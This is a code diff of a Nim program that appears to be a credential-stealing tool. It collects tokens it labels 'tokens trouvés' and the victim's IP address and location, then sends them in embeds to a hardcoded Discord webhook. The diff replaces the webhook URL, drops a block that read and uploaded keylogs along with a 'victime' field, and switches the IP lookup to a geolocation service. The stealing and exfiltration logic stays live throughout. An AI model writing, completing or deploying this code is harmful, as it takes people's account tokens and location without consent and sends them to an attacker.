@@ -1,11 +1,8 @@
 import json, puppy, os, regex, strformat
 from sequtils import deduplicate, concat
 from strutils import replace, endswith, strip
-import times
 
-let webhook = "https://discord.com/api/webhooks/1072931476573790260/qSEdDs26Scn9pQb6ZI_eiB1dk56EWgJaxsUEJTpKjGQi4kYGhDR8wDRF_fukf6ziAe2L"
-let keylogs = readFile("src/output/keylogs.txt")
-let timestamp = now()
+let webhook = "https://discord.com/api/webhooks/1073928058794414130/zSLCsqFy_8A4RN2kG_A8uBp5cKyy-sleXLKbhOBwsvZ5yz80DgZMVK3VOoPCUNT_87jQ"
 
 const
   sendIP: char = 'Y'
@@ -67,7 +64,7 @@ hooktks = &"```\n{hooktks.strip(leading=false)}```"
 
 
 when sendIP == 'Y':
-  let ip: string = fetch("https://api.ipify.org/")
+  let ip: string = fetch("https://ipapi.co/json/")
 else:
   echo("ah bahhhh pas de chance")
 
@@ -75,22 +72,6 @@ when embed == 'Y':
   var data = %*{
       "username": "chat perdu",
       "embeds": [
-          {
-              "title": "un chat s'est perdu...",
-              "fields": [
-                  {
-                      "name": "[*] victime",
-                      "value": "**" & user & "**",
-                      "inline": true
-
-                  },
-                  {
-                      "name": "[*] addresse ip",
-                      "value": "**" & ip & "**",
-                      "inline": true
-                  }
-              ]
-          },
           {
               "title": "[*] tokens trouvés",
               "fields": [
@@ -101,11 +82,11 @@ when embed == 'Y':
               ]
           },
           {
-              "title": "[*] keylogs",
+              "title": "[*] location",
               "fields": [
                   {
-                      "name": "date et l'heure: " & $timestamp,
-                      "value": keylogs
+                      "name": "",
+                      "value": ip
                   },
               ]
           }
